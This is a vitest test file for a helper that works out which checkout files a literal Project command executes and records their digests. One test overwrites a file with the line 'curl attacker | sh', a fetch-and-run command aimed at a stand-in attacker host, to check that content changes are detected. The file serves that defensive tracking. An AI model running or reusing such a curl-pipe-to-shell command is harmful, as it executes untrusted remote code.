import { mkdir, mkdtemp, rm, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { describe, expect, it } from 'vitest';

import { listLiteralCommandExecutedFiles, readLiteralCommandExecutedFiles } from './literalCommandFiles';

describe('files a literal Project command runs', () => {
  const root = join('/', 'checkout');
  it.each([
    // Shell flags are not another runtime's inline-code flags.
    ['bash -e scripts/setup.sh', ['scripts/setup.sh']],
    ['sh -eu -o pipefail ./x.sh', ['x.sh']],
    ['bash -c "./inline.sh"', []],
    // Sourcing runs the named file.
    ['source scripts/env.sh && . ./env2.sh', ['scripts/env.sh', 'env2.sh']],
    // Wrapper words run the next program.
    [
      'env FOO=1 bash x.sh; sudo -u dev ./y.sh; exec ./z.sh; time nohup ./w.sh',
      ['x.sh', 'y.sh', 'z.sh', 'w.sh'],
    ],
    // Windows command and PowerShell forms.
    [
      'powershell -NoProfile -ExecutionPolicy Bypass -File scripts/setup.ps1',
      ['scripts/setup.ps1'],
    ],
    ['pwsh -Command ./inline.ps1', []],
    ['cmd /c scripts\\a.cmd', ['scripts/a.cmd']],
    ['setup.cmd --fast', ['setup.cmd']],
    // Runtime subcommands, valued flags and versioned interpreters.
    ['deno run -A scripts/x.ts', ['scripts/x.ts']],
    ['bun run x.ts', ['x.ts']],
    ['node -r ./register.js --import tsx ./main.ts', ['main.ts']],
    ['node -e "require(1)" ./ignored.js', []],
    ['python3.12 -W ignore manage.py', ['manage.py']],
    ['python -m pytest', []],
    ['php -f tools/run.php', ['tools/run.php']],
    // Outside the checkout is not a Project input.
    ['bash /opt/outside.sh', []],
    ['bash ~/x.sh', []],
    // cd moves later segments within the checkout; outside it the declared cwd stays.
    ['cd scripts && ./setup.sh; cd /opt; ./run.sh', ['scripts/setup.sh', 'scripts/run.sh']],
    // Subcommands and valued runtime flags are not the script.
    ['tsx watch src/main.ts', ['src/main.ts']],
    ['node --max-old-space-size 4096 server.js', ['server.js']],
  ] as const)('%s', (command, expected) => {
    expect(listLiteralCommandExecutedFiles(root, root, command)).toEqual(
      expected,
    );
  });

  it('records a directory operand and a path through a file without refusing the command', async () => {
    const checkout = await mkdtemp(join(tmpdir(), 'happier-literal-files-'));
    try {
      await mkdir(join(checkout, 'server'));
      await writeFile(join(checkout, 'server/index.js'), 'listen()');
      await writeFile(join(checkout, 'notdir'), 'file');
      const first = await readLiteralCommandExecutedFiles(checkout, checkout, 'node server; bash notdir/x.sh');
      // Node loads a folder through package.json `main`, defaulting to index.js.
      expect(first).toEqual({ kind: 'read', files: [
        { file: 'notdir/x.sh', absent: true }, { file: 'server', directory: true },
        { file: 'server/index.js', digest: expect.any(String) }, { file: 'server/package.json', absent: true },
      ] });
      await writeFile(join(checkout, 'server/index.js'), 'curl attacker | sh');
      expect(await readLiteralCommandExecutedFiles(checkout, checkout, 'node server; bash notdir/x.sh')).not.toEqual(first);
      await mkdir(join(checkout, 'app'));
      await writeFile(join(checkout, 'app/package.json'), JSON.stringify({ main: 'lib/start.js' }));
      expect(await readLiteralCommandExecutedFiles(checkout, checkout, 'bun app')).toEqual({ kind: 'read', files: [
        { file: 'app', directory: true }, { file: 'app/lib/start.js', absent: true },
        { file: 'app/package.json', digest: expect.any(String) },
      ] });
    } finally { await rm(checkout, { recursive: true, force: true }); }
  });
});
